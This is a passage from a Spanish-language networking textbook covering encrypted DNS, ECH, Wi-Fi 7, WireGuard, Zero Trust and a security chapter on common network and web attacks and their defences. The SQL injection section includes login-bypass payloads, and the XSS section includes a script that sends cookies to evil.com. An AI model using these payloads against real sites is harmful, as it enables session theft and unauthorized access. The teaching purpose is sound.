Audio/video perdido es aceptable; una llamada con 200ms de latencia, no.
\end{ejemplo}

\section{\eh{magnifying-glass-tilted-left} DoH y DoQ --- DNS moderno}

\begin{concepto}
DNS clásico viaja en texto claro sobre UDP puerto 53. Cualquiera en tu
red (tu ISP, un café con Wi-Fi malicioso) puede ver todos tus
queries DNS: cada sitio que intentas visitar, antes de que cargue.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{llll}
\toprule
\textbf{Protocolo} & \textbf{Puerto} & \textbf{Sobre} & \textbf{Adoptado por} \\
\midrule
DNS clásico         & 53 (UDP/TCP) & Texto claro & Todos (legacy) \\
DoT (DNS over TLS)  & 853          & TCP + TLS   & Android 9+, iOS \\
DoH (DNS over HTTPS)& 443          & HTTPS       & Firefox, Chrome, Cloudflare \\
DoQ (DNS over QUIC) & 853          & QUIC        & En adopción (RFC 9250) \\
\bottomrule
\end{tabular}
\caption{Evolución del DNS cifrado}
\end{table}

\begin{moderno}
\textbf{\emoji{rocket} Cloudflare 1.1.1.1:} resolver DNS público más
rápido del mundo (lanzado 2018). Usa DoH y DoT. Promete no registrar
IPs de usuarios. Tiene \textbf{1.1.1.2} con filtrado de malware y
\textbf{1.1.1.3} con filtrado adicional. Google ofrece \textbf{8.8.8.8}
con las mismas capacidades. Ambos tienen latencia $<$10ms desde México.
\end{moderno}

\begin{cuidado}
\textbf{DoH y privacidad:} DoH oculta tus queries de la red local, pero
el resolver (Cloudflare, Google) sí ve todo. Cambias de que te espíe
tu ISP a que te espíe Cloudflare. Evalúa en qué entidad confías más.
\end{cuidado}

\section{\eh{eye} ECH --- Encrypted Client Hello}

\begin{concepto}
Con HTTPS el contenido está cifrado. Pero el \textbf{Server Name
Indication (SNI)} --- el nombre del dominio que visitas --- viaja en
\textbf{texto claro} en el ClientHello de TLS. Tu ISP o un firewall
pueden saber exactamente qué sitio visitas aunque uses HTTPS.

\textbf{ECH} (Encrypted Client Hello) cifra el SNI usando la clave
pública del servidor, publicada en DNS (registro HTTPS).
\end{concepto}

\begin{lstlisting}
  Sin ECH:
  ClientHello {
    server_name: "ejemplo-bloqueado.com"   <- VISIBLE en texto claro
    ...datos cifrados...
  }

  Con ECH:
  ClientHello (outer) {
    server_name: "cloudflare-esni.com"     <- dominio genérico (visible)
    encrypted_client_hello: [              <- inner ClientHello cifrado
      server_name: "ejemplo.com"           <- real, CIFRADO
      ...
    ]
  }
\end{lstlisting}

\begin{moderno}
\textbf{\emoji{rocket} Adopción:} Firefox habilitó ECH por defecto en 2023.
Chrome lo tiene desde 2024. Cloudflare soporta ECH para todos sus dominios.
Cuando ECH esté universalmente adoptado, los firewalls censores por SNI
serán inefectivos sin interceptar la clave privada del servidor.
\end{moderno}

\section{\eh{satellite-antenna} Wi-Fi 7 --- IEEE 802.11be}

\begin{concepto}
\textbf{Wi-Fi 7} (802.11be) fue aprobado como estándar en 2024. La mejora
más revolucionaria: \textbf{Multi-Link Operation (MLO)}.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lllll}
\toprule
\textbf{Estándar} & \textbf{Wi-Fi} & \textbf{Año} & \textbf{Max teórico} & \textbf{Bandas} \\
\midrule
802.11n  & Wi-Fi 4   & 2009      & 600 Mbps          & 2.4 + 5 GHz \\
802.11ac & Wi-Fi 5   & 2013      & 3.5 Gbps          & 5 GHz \\
802.11ax & Wi-Fi 6/6E & 2019/2021 & 9.6 Gbps         & 2.4+5+6 GHz \\
802.11be & Wi-Fi 7   & 2024      & \textbf{46 Gbps}  & 2.4+5+6 GHz ampliado \\
\bottomrule
\end{tabular}
\caption{Evolución Wi-Fi}
\end{table}

\subsection{Multi-Link Operation (MLO)}

\begin{itemize}
    \item \textbf{Wi-Fi 4/5/6:} tu dispositivo conecta a \textit{una} banda a la vez
          (2.4 GHz O 5 GHz). Si hay interferencia, migras entre bandas.
    \item \textbf{Wi-Fi 7 con MLO:} conecta a \textit{múltiples bandas simultáneamente}
          (2.4 + 5 + 6 GHz en paralelo real).
\end{itemize}

\begin{lstlisting}
  MLO en acción:

  Dispositivo Wi-Fi 7            Router Wi-Fi 7
    link 2.4 GHz ─────────────────────────►
    link 5.0 GHz ─────────────────────────►
    link 6.0 GHz ─────────────────────────►

  El sistema elige dinámicamente qué paquete va por qué link
  según congestión e interferencia. Si 5 GHz tiene interferencia,
  automáticamente usa 6 GHz sin interrupción de la conexión.
\end{lstlisting}

Beneficios de MLO:
\begin{itemize}
    \item \textbf{Latencia reducida:} datos urgentes van por el link más libre
    \item \textbf{Confiabilidad:} si un link falla, los otros continúan
    \item \textbf{Mayor throughput:} agregación real de múltiples links
\end{itemize}

\begin{moderno}
\textbf{\emoji{rocket} 320 MHz de ancho de banda:} Wi-Fi 6 usa hasta 160 MHz.
Wi-Fi 7 usa hasta \textbf{320 MHz} (solo en 6 GHz). Con 4096-QAM y
16 antenas MIMO, alcanza 46 Gbps teóricos. En la práctica, espera
5--10 Gbps en condiciones reales --- suficiente para decenas de streams
de 8K simultáneos.
\end{moderno}

\section{\eh{shield} WireGuard --- VPN Moderna}

\begin{concepto}
\textbf{WireGuard} (2015) es un protocolo VPN extremadamente simple y
rápido. Comparado con OpenVPN (2001) y IPsec: código mucho más pequeño,
criptografía moderna obligatoria, y velocidad cercana a wireline.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{llll}
\toprule
\textbf{Característica} & \textbf{OpenVPN} & \textbf{IPsec} & \textbf{WireGuard} \\
\midrule
Líneas de código    & $\sim$70,000   & $\sim$400,000  & \textbf{$\sim$4,000} \\
Protocolo base      & TCP o UDP      & IP directo     & UDP \\
Cripto obligatoria  & Configurable   & Configurable   & \textbf{Fija, moderna} \\
Handshake           & Lento (TLS)    & IKEv2          & Rápido (1-RTT) \\
Kernel integration  & Userspace      & Parcial        & \textbf{Linux kernel 5.6+} \\
\bottomrule
\end{tabular}
\caption{Comparativa VPN}
\end{table}

WireGuard usa exclusivamente:
\begin{itemize}
    \item \textbf{ChaCha20-Poly1305:} cifrado simétrico (rápido en móviles sin AES-NI)
    \item \textbf{Curve25519:} Diffie-Hellman para intercambio de claves
    \item \textbf{BLAKE2s:} función hash
    \item \textbf{SipHash24:} para la tabla de routing interna
\end{itemize}

No hay negociación de cifrado --- elimina ataques de downgrade de criptografía.

\begin{moderno}
\textbf{\emoji{rocket} WireGuard en producción:} integrado en Linux kernel 5.6
(2020), Android 12+, iOS 15+. Cloudflare usa WireGuard en su servicio
WARP (1.1.1.1 VPN). En benchmarks, WireGuard alcanza velocidades
\textbf{3--4x más rápidas} que OpenVPN en el mismo hardware.
\end{moderno}

\section{\eh{office-building} Zero Trust y BeyondCorp}

\begin{concepto}
\textbf{Zero Trust} es un modelo de seguridad que asume que \textit{ninguna
red es confiable} --- ni la interna. Contrasta con el modelo tradicional
de ``fortaleza y foso'': todo dentro del firewall es confiable.

\emoji{light-bulb} \textbf{Analogía:} modelo tradicional = castillo con
muralla. Si cruzas el firewall, eres confiable y puedes ir a cualquier
habitación. Zero Trust = edificio moderno con tarjetas de acceso en
\textit{cada puerta}. Aunque entres al edificio, cada habitación verifica
tu identidad.
\end{concepto}

\subsection{BeyondCorp --- Zero Trust de Google}

\begin{concepto}
\textbf{BeyondCorp} (Google, 2014) fue la implementación pionera de Zero
Trust a escala. Después de \textbf{Operación Aurora} (ataque chino de 2010
que comprometió la red interna), Google redesarrolló su modelo de acceso.
\end{concepto}

Principios BeyondCorp:
\begin{enumerate}
    \item \textbf{Device Trust:} cada dispositivo tiene un certificado.
          Los dispositivos no administrados no tienen acceso, sin importar
          dónde estén conectados.
    \item \textbf{User Identity:} autenticación fuerte (MFA) en \textit{cada}
          acceso. La VPN corporativa no existe --- el usuario se autentica
          directamente al recurso.
    \item \textbf{Context-Aware Access:} acceso depende del contexto:
          dispositivo administrado, IP inusual, horario normal, rol correcto.
    \item \textbf{Micro-segmentación:} acceso al sistema de RH no da
          acceso al sistema de pagos.
\end{enumerate}

\begin{lstlisting}
  BeyondCorp Architecture:

  Empleado con laptop corporativa
           │
           ▼
    Access Proxy (BeyondCorp)
           │
           ├── Dispositivo registrado? (certificado)
           ├── Usuario autenticado? (Identity-Aware Proxy)
           ├── Contexto normal? (hora, ubicación, comportamiento)
           └── Tiene permiso para ESTE recurso específico?
                        │
               [TODOS SÍ] → Acceso concedido
               [ALGÚN NO] → Acceso denegado + alerta
\end{lstlisting}

\begin{moderno}
\textbf{\emoji{rocket} Google Cloud BeyondCorp Enterprise} permite que
cualquier empresa implemente Zero Trust usando la misma infraestructura
que protege Google:
\begin{itemize}
    \item \textbf{Identity-Aware Proxy (IAP):} acceso a apps internas sin VPN
    \item \textbf{Endpoint Verification:} verifica el estado del dispositivo
    \item \textbf{Context-Aware Access:} políticas basadas en contexto
    \item \textbf{Chrome Enterprise:} el browser como agente de seguridad
\end{itemize}
Hoy, los 100,000+ empleados de Google trabajan sin VPN corporativa tradicional.
\end{moderno}

\begin{cuidado}
\textbf{Zero Trust no es una tecnología, es una filosofía.} No puedes
``comprar Zero Trust''. Requiere cambios arquitectónicos fundamentales:
inventario de todos los recursos, clasificación de datos, autenticación
fuerte universal, y monitoreo continuo. La implementación típica toma
2--3 años en una empresa grande.
\end{cuidado}

\chapter{\eh{locked} Seguridad en Redes}

\begin{concepto}
Todos los protocolos de este libro tienen vectores de ataque. Este capítulo
consolida los conceptos de seguridad: qué garantías busca la seguridad,
cómo se rompen, y cómo se defienden. La seguridad no es un feature que
se agrega al final --- es un diseño desde cero.
\end{concepto}

\section{\eh{triangular-ruler} Tríada CIA --- Los Tres Pilares}

\begin{concepto}
Toda la seguridad informática se reduce a tres objetivos. Memorizarlos:
\textbf{CIA} (Confidentiality, Integrity, Availability).

\emoji{light-bulb} \textbf{Analogía:} una caja fuerte en un banco.
\textbf{Confidencialidad} = solo el dueño puede abrir la caja.
\textbf{Integridad} = el contenido no fue alterado.
\textbf{Disponibilidad} = cuando el dueño llega, la caja está accesible.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.5}
\begin{tabular}{llll}
\toprule
\textbf{Pilar} & \textbf{Pregunta} & \textbf{Amenaza} & \textbf{Mecanismo} \\
\midrule
\textbf{Confidentiality} & Solo el destinatario lee? & Intercepción, sniffing & Cifrado (TLS, WireGuard) \\
\textbf{Integrity} & Los datos llegaron íntegros? & Tampering, modificación & HMAC, firmas digitales \\
\textbf{Availability} & El servicio está disponible? & DDoS, ransomware & Redundancia, rate limiting \\
\bottomrule
\end{tabular}
\caption{Tríada CIA}
\end{table}

\begin{ejemplo}
Un atacante que hace \textbf{ARP Spoofing} rompe \textbf{Confidencialidad}
(ve tu tráfico) e \textbf{Integridad} (puede modificarlo).
Un \textbf{DDoS} rompe \textbf{Availability}.
Un \textbf{ransomware} rompe \textbf{Integrity} y \textbf{Availability}.
\end{ejemplo}

\section{\eh{fire} Firewalls}

\begin{concepto}
Un \textbf{firewall} filtra tráfico según reglas. Es la primera línea
de defensa entre redes de diferente nivel de confianza (Internet vs LAN).

\emoji{light-bulb} \textbf{Analogía:} el guardia de seguridad de un edificio.
Revisa quién entra y sale según una lista de reglas.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{lll}
\toprule
\textbf{Tipo} & \textbf{Opera en} & \textbf{Características} \\
\midrule
Packet filter (L3/L4) & IP, TCP/UDP, puertos & Rápido, sin estado, fácil de evadir \\
Stateful (L4)         & Tracks conexiones TCP & Ve si paquete pertenece a flujo legítimo \\
Application (L7)      & Contenido de la app   & Deep Packet Inspection, más lento \\
NGFW (Next-Gen)       & L3-L7 + IDS/IPS       & Identidad de usuario, SSL inspection \\
WAF                   & HTTP/HTTPS            & Protege apps web (SQLi, XSS, OWASP) \\
\bottomrule
\end{tabular}
\caption{Tipos de firewall}
\end{table}

\subsection{Reglas de firewall --- Lógica básica}

\begin{lstlisting}
  Regla (stateless packet filter):
  ┌────────┬──────────┬──────────┬──────────┬──────────┬────────┐
  │ Source │ Src Port │   Dest   │ Dst Port │ Protocol │ Action │
  ├────────┼──────────┼──────────┼──────────┼──────────┼────────┤
  │  any   │   any    │ 10.0.0.5 │   443    │   TCP    │ ALLOW  │
  │  any   │   any    │ 10.0.0.5 │    80    │   TCP    │ ALLOW  │
  │  any   │   any    │   any    │   any    │   any    │  DENY  │ ← default deny
  └────────┴──────────┴──────────┴──────────┴──────────┴────────┘

  Principio: todo lo que no esté explícitamente permitido, está DENEGADO.
\end{lstlisting}

\begin{cuidado}
\textbf{SSL Inspection en NGFWs:} un NGFW puede descifrar TLS para inspeccionarlo
(MITM corporativo). El firewall presenta su propio certificado al cliente. Esto
rompe End-to-End Encryption a nivel corporativo. Es legal (en entornos corporativos,
la empresa es dueña de los dispositivos), pero debes saber que tu tráfico HTTPS
podría ser inspeccionado en redes corporativas.
\end{cuidado}

\section{\eh{locked-with-key} VPN --- Virtual Private Network}

\begin{concepto}
Una \textbf{VPN} crea un túnel cifrado sobre una red no confiable (Internet).
Todo el tráfico viaja por ese túnel, protegido de observadores externos.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lllll}
\toprule
\textbf{Protocolo} & \textbf{Puerto} & \textbf{Crypto} & \textbf{Velocidad} & \textbf{Uso típico} \\
\midrule
PPTP       & 1723/TCP & RC4 (roto) & Rápido & \emoji{skull} Evitar \\
L2TP/IPsec & 1701/UDP + 4500 & AES & Mediano & Empresas legacy \\
OpenVPN    & 1194/UDP o 443 & TLS & Mediano & Uso general \\
IKEv2/IPsec & 500+4500/UDP & AES-GCM & Rápido & Móviles \\
WireGuard  & 51820/UDP & ChaCha20 & \textbf{Muy rápido} & Moderno, recomendado \\
\bottomrule
\end{tabular}
\caption{Protocolos VPN comparados}
\end{table}

\subsection{mTLS --- Mutual TLS}

\begin{concepto}
TLS normal: el cliente verifica la identidad del servidor (certificado).
\textbf{mTLS} (Mutual TLS): \textit{ambos} se verifican mutuamente.
El servidor también exige un certificado válido del cliente.
\end{concepto}

\begin{lstlisting}
  TLS normal:
    Cliente ──── verifica certificado ────► Servidor
    Cliente ◄──────────────────────────── Servidor (confiado)

  mTLS:
    Cliente ──── verifica certificado ────► Servidor
    Cliente ◄──── verifica certificado ─── Servidor
    (AMBOS presentan certificados X.509)

  Uso: microservicios, APIs inter-servicio, Zero Trust.
  El servicio A no habla con el servicio B a menos que tenga
  el certificado correcto --- elimina acceso no autorizado incluso
  dentro de la red interna.
\end{lstlisting}

\section{\eh{detective} Ataques de Red --- Catálogo}

\subsection{ARP Spoofing / ARP Poisoning}

\begin{cuidado}
\textbf{ARP Spoofing:}

\begin{enumerate}
    \item ARP no tiene autenticación: cualquiera puede mandar un ARP Reply.
    \item El atacante envía ARP Replies falsos: ``La IP 192.168.1.1 tiene
          MAC aa:bb:cc:dd:ee:ff'' (la MAC del atacante).
    \item Las víctimas actualizan su ARP cache.
    \item Todo el tráfico destinado al gateway pasa por el atacante:
          \textbf{Man-in-the-Middle (MitM)}.
\end{enumerate}

\begin{lstlisting}
  Normal:    Víctima ──────────────────► Gateway ──► Internet
  Atacado:   Víctima ──► Atacante MitM ──► Gateway ──► Internet
                         (ve y modifica todo)
\end{lstlisting}

\textbf{Defensa:}
\begin{itemize}
    \item \textbf{Dynamic ARP Inspection (DAI):} el switch valida ARP contra
          la tabla DHCP Snooping. Si la MAC no coincide, descarta el paquete.
    \item \textbf{Static ARP entries:} configurar entradas ARP estáticas para
          el gateway (impracticable en redes grandes).
    \item \textbf{Cifrado end-to-end:} aunque el atacante intercepte el tráfico,
          no puede leerlo ni modificarlo (TLS, mTLS).
\end{itemize}
\end{cuidado}

\subsection{DNS Spoofing / Cache Poisoning}

\begin{cuidado}
\textbf{DNS Cache Poisoning:}

DNS usa UDP sin autenticación. El atacante puede enviar respuestas DNS
falsas antes de que llegue la legítima.

\begin{enumerate}
    \item Cliente hace query: ``¿IP de banco.com?''
    \item Atacante envía respuesta falsa más rápido que el servidor real:
          ``banco.com = 192.168.1.99'' (servidor del atacante)
    \item El resolver guarda la respuesta falsa en caché
    \item Todos los clientes que pregunten por banco.com van al servidor del atacante
\end{enumerate}

\textbf{Defensa:}
\begin{itemize}
    \item \textbf{DNSSEC:} firma criptográfica de los registros DNS. El resolver
          verifica la firma antes de aceptar la respuesta.
    \item \textbf{DoH/DoT:} cifra el canal DNS, evita inyección en tránsito.
    \item \textbf{Randomización de puerto origen y Query ID:} hace más difícil
          adivinar los parámetros de la query para enviar una respuesta falsa.
\end{itemize}
\end{cuidado}

\subsection{BGP Hijacking}

\begin{cuidado}
\textbf{BGP Hijacking:} BGP no tiene autenticación. Un ASN malicioso puede
anunciar prefijos IP que no le pertenecen --- y el tráfico de esos IPs
se redirige a través del atacante.

Ejemplo real: \textbf{Pakistan Telecom (2008)} anunció el prefijo de YouTube
(208.65.153.0/24) a level3, y durante 2 horas el tráfico de YouTube
de todo el mundo fue al nulo de Pakistan Telecom.

\textbf{Defensa:}
\begin{itemize}
    \item \textbf{RPKI (Resource Public Key Infrastructure):} firma criptográfica
          que une un prefijo IP a un ASN específico. Los routers descartan
          anuncios BGP sin firma válida.
    \item \textbf{Route filtering:} cada ISP solo acepta anuncios de prefijos
          que el peer tiene autorización de anunciar.
    \item \textbf{BGPsec:} extiende BGP con firmas por hop. Más seguro que RPKI
          solo, pero adopción lenta.
\end{itemize}
\end{cuidado}

\subsection{DDoS --- Distributed Denial of Service}

\begin{cuidado}
\textbf{DDoS:} agotar recursos de un servidor (CPU, RAM, ancho de banda)
con tráfico desde miles de fuentes simultáneas (botnet).

Tipos de DDoS:

\begin{center}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{Tipo} & \textbf{Mecanismo} & \textbf{Amplificación} \\
\midrule
Volumétrico & Inundar de datos (Gbps) & DNS Amplification (x70), NTP (x556) \\
Protocol    & Agotar tabla de estados & SYN Flood, Smurf \\
Application & Agotar recursos de app  & HTTP Flood, Slowloris \\
\bottomrule
\end{tabular}
\end{center}

\textbf{Amplificación DNS:} el atacante envía query DNS con IP de origen
\textit{suplantada} (IP de la víctima). El servidor DNS responde a la víctima
con un paquete $\sim$70x más grande. Con 1 Mbps de tráfico de ataque,
la víctima recibe 70 Mbps.

\textbf{Defensas:}
\begin{itemize}
    \item \textbf{Rate limiting:} limitar requests por IP en tiempo real
    \item \textbf{Anycast:} distribuir el tráfico entre múltiples datacenters globales
          (Cloudflare absorbe DDoS distribuyendo el tráfico a sus 200+ PoPs)
    \item \textbf{BCP38 (Ingress Filtering):} ISPs descartan paquetes con IP origen
          suplantada --- elimina amplificación en origen
    \item \textbf{SYN Cookies:} el servidor no guarda estado hasta recibir el ACK
\end{itemize}
\end{cuidado}

\subsection{Man-in-the-Middle (MitM)}

\begin{cuidado}
\textbf{MitM:} el atacante se interpone entre dos partes que creen comunicarse
directamente. Puede leer y modificar el tráfico.

Vectores comunes:
\begin{itemize}
    \item \textbf{Rogue Wi-Fi AP:} el atacante crea un hotspot ``Starbucks Free WiFi''
          y todo el tráfico pasa por su máquina.
    \item \textbf{ARP Spoofing:} como vimos en la sección anterior.
    \item \textbf{SSL Stripping:} el atacante intercepta la redirección HTTP→HTTPS
          y presenta HTTP al cliente mientras habla HTTPS con el servidor.
\end{itemize}

\textbf{Defensa universal:} \textbf{HSTS} (HTTP Strict Transport Security) ---
el servidor indica al browser que \textit{siempre} use HTTPS, nunca HTTP.
El browser rechaza versiones HTTP incluso si el atacante intenta forzarlas.
Con HSTS Preloading, el browser viene con la lista hardcoded antes de la primera
conexión.
\end{cuidado}

\section{\eh{bar-chart} IDS e IPS --- Detección y Prevención de Intrusiones}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{llll}
\toprule
\textbf{Sistema} & \textbf{Nombre} & \textbf{Acción} & \textbf{Posición} \\
\midrule
IDS & Intrusion Detection System  & Detecta y alerta (pasivo)  & Fuera del flujo \\
IPS & Intrusion Prevention System & Detecta y bloquea (activo) & En el flujo \\
\bottomrule
\end{tabular}
\caption{IDS vs IPS}
\end{table}

Un IDS/IPS analiza el tráfico buscando \textbf{firmas} (patrones conocidos de
ataques) o \textbf{anomalías} (desviaciones del comportamiento normal).

\begin{ejemplo}
\textbf{Snort} (open source, Cisco) y \textbf{Suricata} son los IDS/IPS más
usados. Una regla Snort que detecta SYN Flood:

\begin{lstlisting}
alert tcp any any -> $HOME_NET any \
  (flags:S; \
   detection_filter:track by_dst, count 1000, seconds 1; \
   msg:"Posible SYN Flood detectado"; \
   sid:1000001;)
\end{lstlisting}

Esto alerta si un destino recibe más de 1000 SYNs por segundo.
\end{ejemplo}

\section{\eh{memo} OWASP Top 10 --- Los ataques más comunes a aplicaciones web}

\begin{concepto}
\textbf{OWASP} (Open Web Application Security Project) publica anualmente
el Top 10 de vulnerabilidades más críticas. Todo desarrollador debería
conocerlos.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{\#} & \textbf{Vulnerabilidad} & \textbf{Ejemplo} \\
\midrule
1 & Broken Access Control       & Ver datos de otro usuario cambiando el ID en la URL \\
2 & Cryptographic Failures      & Contraseñas en MD5, HTTP sin TLS \\
3 & Injection (SQLi, XSS)       & \texttt{' OR 1=1;--} en un campo de login \\
4 & Insecure Design             & Flujos de negocio sin controles de seguridad \\
5 & Security Misconfiguration   & Servicios de debug activos en producción \\
6 & Vulnerable Components       & Usar log4j 2.14.0 (Log4Shell) \\
7 & Auth Failures               & Contraseñas débiles, sin MFA, tokens largos \\
8 & Software Integrity Failures & Dependencias sin verificar, CI/CD sin protección \\
9 & Logging \& Monitoring Failures & Sin logs de auth, sin alertas de anomalías \\
10 & SSRF                       & Servidor hace requests a su propia infraestructura \\
\bottomrule
\end{tabular}
\caption{OWASP Top 10 (2021)}
\end{table}

\subsection{SQL Injection}

\begin{cuidado}
\textbf{SQLi:} el atacante inyecta SQL en un campo de entrada.

\begin{lstlisting}[language=SQL]
-- Consulta original (vulnerable):
SELECT * FROM usuarios WHERE user='INPUT' AND pass='INPUT2';

-- El atacante escribe en el campo usuario:
-- admin'--
-- La consulta queda:
SELECT * FROM usuarios WHERE user='admin'--' AND pass='INPUT2';
-- El -- comenta el resto → login sin contraseña

-- O peor, escribe: ' OR 1=1;--
SELECT * FROM usuarios WHERE user='' OR 1=1;--' AND pass='';
-- Devuelve TODOS los usuarios
\end{lstlisting}

\textbf{Defensa:} \textbf{Prepared Statements / Parameterized Queries}.
El input nunca se interpreta como SQL.

\begin{lstlisting}
# Python con parameterized query (seguro):
cursor.execute("SELECT * FROM usuarios WHERE user=? AND pass=?",
               (usuario, password))
\end{lstlisting}
\end{cuidado}

\subsection{XSS --- Cross-Site Scripting}

\begin{cuidado}
\textbf{XSS:} el atacante inyecta JavaScript en una página web que otros
usuarios cargarán. El script se ejecuta en el browser de la víctima con
sus cookies y sesión.

\begin{lstlisting}
  Stored XSS:
  1. Atacante publica comentario:
     <script>fetch('http://evil.com/?c='+document.cookie)</script>
  2. Otro usuario carga la página con ese comentario
  3. El script roba la cookie de sesión del usuario → account takeover
\end{lstlisting}

\textbf{Defensa:}
\begin{itemize}
    \item \textbf{Output encoding:} convertir \texttt{<} → \texttt{\&lt;} antes de
          renderizar en HTML.
    \item \textbf{Content Security Policy (CSP):} header HTTP que indica al browser
          de qué fuentes puede cargar scripts. Bloquea scripts inline.
    \item \textbf{HttpOnly cookies:} cookies que JavaScript no puede leer,
          aunque inyecte código.
\end{itemize}
\end{cuidado}

\section{\eh{locked-with-key} PKI y Certificados --- Revisión de Confianza}

\begin{concepto}
La seguridad de HTTPS descansa en un ecosistema de \textbf{Autoridades
Certificadoras (CAs)} en las que los browsers confían implícitamente.
Los browsers/OS vienen con $\sim$100--200 CAs raíz preinstaladas.
\end{concepto}

\begin{lstlisting}
  Tipos de certificados:

  DV (Domain Validation):
   └── Solo verifica que el solicitante controla el dominio
       (Let's Encrypt lo hace automáticamente en minutos)

  OV (Organization Validation):
   └── Verifica que la organización existe legalmente
       (manual, tarda días)

  EV (Extended Validation):
   └── Verificación exhaustiva de la empresa
       (el nombre de la empresa aparecía en la barra verde - hoy browsers
        eliminaron la barra verde porque los usuarios no la entendían)
\end{lstlisting}

\begin{cuidado}
\textbf{Certificate Transparency (CT):} desde 2018, Chrome requiere que
todos los certificados sean registrados públicamente en logs CT (append-only,
auditables). Si una CA emite un certificado fraudulento para ``google.com'',
aparece en los logs y puede ser revocado. Antes de CT, las CAs podían emitir
certificados silenciosamente.

\textbf{Certificate Pinning:} apps móviles pueden hardcodear el hash del
certificado esperado. Si el certificado cambia (ataque MitM con cert falso),
la app rechaza la conexión. Riesgo: si la empresa cambia su certificado
legítimamente, la app rompe.
\end{cuidado}

\section{\eh{broom} RPKI --- Asegurando el Routing de Internet}

\begin{concepto}
\textbf{RPKI} (Resource Public Key Infrastructure) es la solución al BGP
Hijacking. Crea un sistema de firma criptográfica que prueba qué ASN tiene
autorización de anunciar qué prefijos IP.
\end{concepto}

\begin{lstlisting}
  Sin RPKI:
  AS64500 anuncia 8.8.8.0/24 (de Google)
  → Routers del mundo creen el anuncio
  → Tráfico a Google va a AS64500

  Con RPKI:
  AS64500 anuncia 8.8.8.0/24
  → Router verifica: ¿existe ROA (Route Origin Authorization)
    que diga que AS15169 (Google) puede anunciar 8.8.8.0/24?
  → La respuesta es SÍ → el anuncio de AS64500 es INVÁLIDO
  → Router descarta el anuncio
\end{lstlisting}

\begin{moderno}
\textbf{\emoji{rocket} Adopción de RPKI (2024):} Cloudflare, AT\&T, Telia, LACNIC
y muchos otros ya filtran anuncios RPKI-inválidos. Aproximadamente \textbf{40\%}
del espacio de direcciones IP global tiene ROAs publicadas. El progreso es lento:
requiere que cada ISP actualice su política de routing.

En México, LACNIC es el RIR que gestiona el registro de ROAs para LATAM.
\end{moderno}

\section{\eh{bar-chart} Herramientas de Diagnóstico y Seguridad}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{Herramienta} & \textbf{Uso} & \textbf{Notas} \\
\midrule
\texttt{nmap}      & Escaneo de puertos y OS fingerprinting & Herramienta de pentesting estándar \\
\texttt{Wireshark} & Captura y análisis de paquetes (GUI) & Análisis de protocolos \\
\texttt{tcpdump}   & Captura de paquetes (CLI) & Para servidores sin GUI \\
\texttt{netstat/ss}& Ver conexiones activas y puertos & Diagnóstico local \\
\texttt{arp -a}    & Ver tabla ARP & Detectar ARP spoofing \\
\texttt{traceroute}& Ver ruta de paquetes & Detectar desvíos BGP \\
\texttt{curl -v}   & HTTP/HTTPS detallado & Ver headers, certificados \\
\texttt{openssl}   & Verificar certificados TLS & \texttt{openssl s\_client -connect host:443} \\
\bottomrule
\end{tabular}
\caption{Herramientas de red y seguridad}
\end{table}

\begin{codigo}
\begin{lstlisting}
# Ver certificado TLS de un servidor:
openssl s_client -connect google.com:443 -servername google.com

# Escanear puertos abiertos (autorización requerida):
nmap -sV -O 192.168.1.0/24

# Capturar tráfico en interfaz eth0:
tcpdump -i eth0 -w captura.pcap

# Ver conexiones activas:
ss -tulpn

# Verificar si una respuesta DNS tiene RRSIG (DNSSEC):
dig +dnssec google.com A
\end{lstlisting}
\end{codigo}

\section{\eh{magnifying-glass-tilted-right} Resumen: Defensa en Profundidad}

\begin{concepto}
\textbf{Defense in Depth} (Defensa en Profundidad): no depender de una sola
capa de seguridad. Si un control falla, los otros detienen al atacante.

\emoji{light-bulb} \textbf{Analogía:} una cebolla. Pelar una capa no da
acceso al centro --- hay más capas por atravesar.
\end{concepto}

\begin{lstlisting}
  Capas de defensa en una organización típica:

  Internet
     │
     ▼
  [Firewall perimetral + DDoS mitigation (Cloudflare/Akamai)]
     │
     ▼
  [DMZ: Load balancers, WAF, reverse proxies]
     │
     ▼
  [Red interna segmentada con VLANs]
     │ (cada segmento tiene su propio firewall)
     ▼
  [Hosts con: cifrado en disco, antivirus, EDR]
     │
     ▼
  [Aplicaciones: autenticación fuerte (MFA), autorización (RBAC/ABAC)]
     │
     ▼
  [Datos: cifrado en reposo (AES-256), en tránsito (TLS 1.3)]
     │
     ▼
  [Logging y SIEM: todo se registra, correlaciona y alerta]
\end{lstlisting}

Principios clave:
\begin{itemize}
    \item \textbf{Least Privilege:} cada usuario/proceso tiene solo los permisos
          que necesita para su función.
    \item \textbf{Fail-Closed:} si el sistema de seguridad falla, deniega acceso
          (no permite por defecto).
    \item \textbf{Assume Breach:} asumir que el atacante ya está dentro y
          diseñar para limitar el daño (Zero Trust).
    \item \textbf{Patch Management:} las vulnerabilidades conocidas son las más
          explotadas. Actualizar sistemas es la defensa más efectiva.
\end{itemize}


\end{document}
